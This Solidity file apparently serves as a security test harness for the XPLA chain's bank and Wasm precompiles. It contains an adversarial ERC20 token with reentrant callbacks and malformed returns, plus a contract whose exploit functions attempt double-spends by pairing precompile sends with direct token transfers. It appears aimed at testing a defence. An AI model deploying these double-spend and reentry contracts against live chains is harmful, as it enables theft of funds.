// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Coin} from "cosmos-evm-contracts/precompiles/common/Types.sol";
import {IBank, BANK_PRECOMPILE_ADDRESS} from "../xpla/bank/IBank.sol";
import {IWasm, WASM_PRECOMPILE_ADDRESS} from "../xpla/wasm/IWasm.sol";

contract PoCToken is ERC20 {
    constructor(uint256 supply) ERC20("PoC Token", "POC") {
        _mint(msg.sender, supply);
    }
}

contract AdversarialXerc20 is ERC20 {
    enum TransferReturnMode {
        Normal,
        False,
        Malformed
    }

    address public callbackTarget;
    bytes public callbackData;
    bool public catchCallbackRevert;
    address public callbackSender;
    address public requiredCallbackSender;
    uint256 public burnIterations;
    bytes32 public burnAccumulator;
    address public adverseReturnSender;
    TransferReturnMode public transferReturnMode;

    bool private callbackEntered;
    bool private requiredCallbackSkipped;

    event TransferProbe(
        uint256 gasAtEntry,
        address indexed operator,
        address indexed from,
        address to,
        uint256 amount
    );
    event PoisonLog(bytes32 indexed marker);
    event CallbackResult(bool success, bytes returnData);

    constructor(uint256 supply) ERC20("Adversarial Token", "ADV") {
        _mint(msg.sender, supply);
    }

    function configureCallback(
        address target,
        bytes calldata data,
        bool catchRevert,
        uint256 iterations
    ) external {
        callbackTarget = target;
        callbackData = data;
        catchCallbackRevert = catchRevert;
        burnIterations = iterations;
    }

    function configureCallbackSender(address sender) external {
        callbackSender = sender;
    }

    function configureRequiredCallbackSender(address sender) external {
        requiredCallbackSender = sender;
    }

    function configureTransferReturn(
        address sender,
        TransferReturnMode mode
    ) external {
        adverseReturnSender = sender;
        transferReturnMode = mode;
    }

    function transfer(
        address to,
        uint256 amount
    ) public override returns (bool) {
        address from = _msgSender();
        _transfer(from, to, amount);

        if (requiredCallbackSkipped) {
            requiredCallbackSkipped = false;
            return false;
        }

        if (from != adverseReturnSender) {
            return true;
        }
        if (transferReturnMode == TransferReturnMode.False) {
            return false;
        }
        if (transferReturnMode == TransferReturnMode.Malformed) {
            assembly {
                mstore(0, 1)
                return(0, 1)
            }
        }
        return true;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        super._beforeTokenTransfer(from, to, amount);

        bool callbackRequired =
            requiredCallbackSender != address(0) &&
            from == requiredCallbackSender;

        if (from == address(0) || callbackEntered) {
            return;
        }
        if (callbackSender != address(0) && from != callbackSender) {
            requiredCallbackSkipped = callbackRequired;
            return;
        }

        emit TransferProbe(gasleft(), msg.sender, from, to, amount);

        bytes32 accumulator = burnAccumulator;
        for (uint256 i = 0; i < burnIterations; i++) {
            accumulator = keccak256(abi.encodePacked(accumulator, i));
        }
        burnAccumulator = accumulator;

        if (callbackTarget == address(0)) {
            requiredCallbackSkipped = callbackRequired;
            return;
        }

        callbackEntered = true;
        emit PoisonLog(keccak256("adversarial callback"));
        (bool success, bytes memory returnData) = callbackTarget.call(
            callbackData
        );
        callbackEntered = false;

        if (!success && !catchCallbackRevert) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }

        require(!callbackRequired || success, "required callback failed");

        emit CallbackResult(success, returnData);
    }
}

contract Xerc20ReentryTarget {
    IBank private constant BANK = IBank(BANK_PRECOMPILE_ADDRESS);
    IWasm private constant WASM = IWasm(WASM_PRECOMPILE_ADDRESS);

    error AdversarialCallbackRevert();

    IERC20 public immutable token;
    string public denom;
    address public recipient;
    uint256 public amount;
    bool public revertAfterCallback;
    address public nativeBalanceTarget;
    uint256 public expectedNativeBalance;

    event CallbackEntered(uint256 gasLeft);
    event ReentryCompleted(bool success);
    event NativeBalanceObserved(address indexed target, uint256 balance);

    constructor(IERC20 token_, string memory denom_) {
        token = token_;
        denom = denom_;
    }

    function configure(
        address recipient_,
        uint256 amount_,
        bool revertAfterCallback_
    ) external {
        recipient = recipient_;
        amount = amount_;
        revertAfterCallback = revertAfterCallback_;
    }

    function configureNativeBalanceWitness(
        address target,
        uint256 expectedBalance
    ) external {
        nativeBalanceTarget = target;
        expectedNativeBalance = expectedBalance;
    }

    function onXerc20Transfer() external {
        require(msg.sender == address(token), "only token");
        emit CallbackEntered(gasleft());

        if (nativeBalanceTarget != address(0)) {
            uint256 nativeBalance = WASM.balance(nativeBalanceTarget, "axpla");
            require(
                nativeBalance == expectedNativeBalance,
                "stale native balance"
            );
            emit NativeBalanceObserved(nativeBalanceTarget, nativeBalance);
        }

        if (amount != 0) {
            Coin[] memory coins = new Coin[](1);
            coins[0] = Coin({denom: denom, amount: amount});
            bool success = BANK.send(address(this), recipient, coins);
            emit ReentryCompleted(success);
        }

        if (revertAfterCallback) {
            revert AdversarialCallbackRevert();
        }
    }
}

contract BankXerc20DoubleSpendPoC {
    IBank private constant BANK = IBank(BANK_PRECOMPILE_ADDRESS);
    IWasm private constant WASM = IWasm(WASM_PRECOMPILE_ADDRESS);

    error ForcedOuterRevertAfterWasm(bytes32 marker);

    bytes32 public constant WASM_EXECUTION_COMPLETED_MARKER =
        keccak256("wasm execution completed");

    IERC20 public immutable token;
    string public denom;

    event WasmFundsGasProbe(uint256 gasBeforeCall, uint256 gasAfterCall);
    event WasmFundsCallResult(bool success, bytes returnData);
    event BankSendGasProbe(uint256 gasBeforeCall, uint256 gasAfterCall);
    event BankSendCallResult(bool success, bytes returnData);
    event Xerc20VisibilityProbe(address indexed account, uint256 evmBalance);

    constructor(IERC20 token_, string memory denom_) {
        token = token_;
        denom = denom_;
    }

    receive() external payable {}

    function tryBankSend(
        address recipient,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        Coin[] memory coins = new Coin[](1);
        coins[0] = Coin({denom: denom, amount: amount});

        uint256 gasBeforeCall = gasleft();
        (success, returnData) = BANK_PRECOMPILE_ADDRESS.call(
            abi.encodeCall(IBank.send, (address(this), recipient, coins))
        );
        emit BankSendGasProbe(gasBeforeCall, gasleft());
        emit BankSendCallResult(success, returnData);
    }

    function exploit(
        address bankRecipient,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory coins = new Coin[](1);
        coins[0] = Coin({denom: denom, amount: amount});

        require(
            BANK.send(address(this), bankRecipient, coins),
            "bank send failed"
        );
        require(token.transfer(directRecipient, amount), "transfer failed");
    }

    function exploitViaWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);
        require(token.transfer(directRecipient, amount), "transfer failed");
    }

    function executeWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bytes memory) {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        uint256 gasBeforeCall = gasleft();
        bytes memory result = WASM.executeContract(
            address(this),
            wasmContract,
            wasmMsg,
            funds
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());

        return result;
    }

    function executeWasmFundsAndObserveEVM(
        address wasmContract,
        bytes calldata wasmMsg,
        address observedAccount,
        uint256 amount
    ) external returns (bytes memory) {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        bytes memory result = WASM.executeContract(
            address(this),
            wasmContract,
            wasmMsg,
            funds
        );
        emit Xerc20VisibilityProbe(
            observedAccount,
            token.balanceOf(observedAccount)
        );
        return result;
    }

    function executeWasmThenTransfer(
        address wasmContract,
        bytes calldata wasmMsg,
        address recipient,
        uint256 amount
    ) external returns (bytes memory result) {
        Coin[] memory funds = new Coin[](0);
        uint256 gasBeforeCall = gasleft();
        result = WASM.executeContract(
            address(this),
            wasmContract,
            wasmMsg,
            funds
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
        require(token.transfer(recipient, amount), "continuation failed");
    }

    function executeNativeThenWasmFunds(
        address nativeWasmContract,
        bytes calldata nativeWasmMsg,
        uint256 nativeAmount,
        address xerc20WasmContract,
        bytes calldata xerc20WasmMsg,
        uint256 xerc20Amount
    ) external {
        _executeNativeThenWasmFunds(
            nativeWasmContract,
            nativeWasmMsg,
            nativeAmount,
            xerc20WasmContract,
            xerc20WasmMsg,
            xerc20Amount
        );
    }

    function executeNativeThenWasmFundsThenRevert(
        address nativeWasmContract,
        bytes calldata nativeWasmMsg,
        uint256 nativeAmount,
        address xerc20WasmContract,
        bytes calldata xerc20WasmMsg,
        uint256 xerc20Amount
    ) external {
        require(msg.sender == address(this), "only self");
        _executeNativeThenWasmFunds(
            nativeWasmContract,
            nativeWasmMsg,
            nativeAmount,
            xerc20WasmContract,
            xerc20WasmMsg,
            xerc20Amount
        );
        revert ForcedOuterRevertAfterWasm(WASM_EXECUTION_COMPLETED_MARKER);
    }

    function tryExecuteNativeThenWasmFundsThenRevert(
        address nativeWasmContract,
        bytes calldata nativeWasmMsg,
        uint256 nativeAmount,
        address xerc20WasmContract,
        bytes calldata xerc20WasmMsg,
        uint256 xerc20Amount
    ) external returns (bool success, bytes memory returnData) {
        (success, returnData) = address(this).call(
            abi.encodeCall(
                this.executeNativeThenWasmFundsThenRevert,
                (
                    nativeWasmContract,
                    nativeWasmMsg,
                    nativeAmount,
                    xerc20WasmContract,
                    xerc20WasmMsg,
                    xerc20Amount
                )
            )
        );
        emit WasmFundsCallResult(success, returnData);
    }

    function tryExecuteWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        uint256 gasBeforeCall = gasleft();
        (success, returnData) = WASM_PRECOMPILE_ADDRESS.call(
            abi.encodeCall(
                IWasm.executeContract,
                (address(this), wasmContract, wasmMsg, funds)
            )
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
        emit WasmFundsCallResult(success, returnData);
    }

    function executeWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bytes memory) {
        require(msg.sender == address(this), "only self");

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);
        revert ForcedOuterRevertAfterWasm(WASM_EXECUTION_COMPLETED_MARKER);
    }

    function tryExecuteWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        (success, returnData) = address(this).call(
            abi.encodeCall(
                this.executeWasmFundsThenRevert,
                (wasmContract, wasmMsg, amount)
            )
        );
        emit WasmFundsCallResult(success, returnData);
    }

    // No token call: exhaustion here belongs to the native Wasm execution.
    function tryExecuteWasmSDKGas(
        address wasmContract,
        uint256 gasBudget
    ) external returns (bool success, bytes memory returnData) {
        Coin[] memory funds = new Coin[](0);
        bytes memory input = abi.encodeCall(
            IWasm.executeContract,
            (address(this), wasmContract, bytes('{"increment":{}}'), funds)
        );
        uint256 gasBeforeCall = gasleft();
        (success, returnData) = WASM_PRECOMPILE_ADDRESS.call{gas: gasBudget}(input);
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
        emit WasmFundsCallResult(success, returnData);
    }

    function _executeNativeThenWasmFunds(
        address nativeWasmContract,
        bytes calldata nativeWasmMsg,
        uint256 nativeAmount,
        address xerc20WasmContract,
        bytes calldata xerc20WasmMsg,
        uint256 xerc20Amount
    ) internal {
        Coin[] memory nativeFunds = new Coin[](1);
        nativeFunds[0] = Coin({denom: "axpla", amount: nativeAmount});
        WASM.executeContract(
            address(this),
            nativeWasmContract,
            nativeWasmMsg,
            nativeFunds
        );

        Coin[] memory xerc20Funds = new Coin[](1);
        xerc20Funds[0] = Coin({denom: denom, amount: xerc20Amount});
        WASM.executeContract(
            address(this),
            xerc20WasmContract,
            xerc20WasmMsg,
            xerc20Funds
        );
    }

    function executeWasmMixedFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount,
        uint256 xerc20Amount
    ) external returns (bytes memory) {
        return _executeWasmMixedFunds(
            wasmContract,
            wasmMsg,
            nativeAmount,
            xerc20Amount
        );
    }

    function executeWasmMixedFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount,
        uint256 xerc20Amount
    ) external {
        require(msg.sender == address(this), "only self");
        _executeWasmMixedFunds(
            wasmContract,
            wasmMsg,
            nativeAmount,
            xerc20Amount
        );
        revert ForcedOuterRevertAfterWasm(WASM_EXECUTION_COMPLETED_MARKER);
    }

    function tryExecuteWasmMixedFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount,
        uint256 xerc20Amount
    ) external returns (bool success, bytes memory returnData) {
        uint256 gasBeforeCall = gasleft();
        (success, returnData) = address(this).call(
            abi.encodeCall(
                this.executeWasmMixedFundsThenRevert,
                (wasmContract, wasmMsg, nativeAmount, xerc20Amount)
            )
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
        emit WasmFundsCallResult(success, returnData);
    }

    function _executeWasmMixedFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount,
        uint256 xerc20Amount
    ) internal returns (bytes memory result) {
        uint256 fundsLength = (nativeAmount == 0 ? 0 : 1) +
            (xerc20Amount == 0 ? 0 : 1);
        Coin[] memory funds = new Coin[](fundsLength);
        uint256 index;
        if (nativeAmount != 0) {
            funds[index++] = Coin({denom: "axpla", amount: nativeAmount});
        }
        if (xerc20Amount != 0) {
            funds[index] = Coin({denom: denom, amount: xerc20Amount});
        }

        uint256 gasBeforeCall = gasleft();
        result = WASM.executeContract(
            address(this),
            wasmContract,
            wasmMsg,
            funds
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
    }

    function executeWasmNativeFundsAndAssertBalance(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount
    ) external {
        uint256 senderBalanceBefore = address(this).balance;
        uint256 wasmBalanceBefore = WASM.balance(wasmContract, "axpla");
        require(
            senderBalanceBefore >= nativeAmount,
            "insufficient native seed"
        );

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: "axpla", amount: nativeAmount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);

        require(
            address(this).balance == senderBalanceBefore - nativeAmount,
            "native sender balance not updated"
        );
        require(
            WASM.balance(wasmContract, "axpla") == wasmBalanceBefore + nativeAmount,
            "native wasm balance not updated"
        );
    }
}
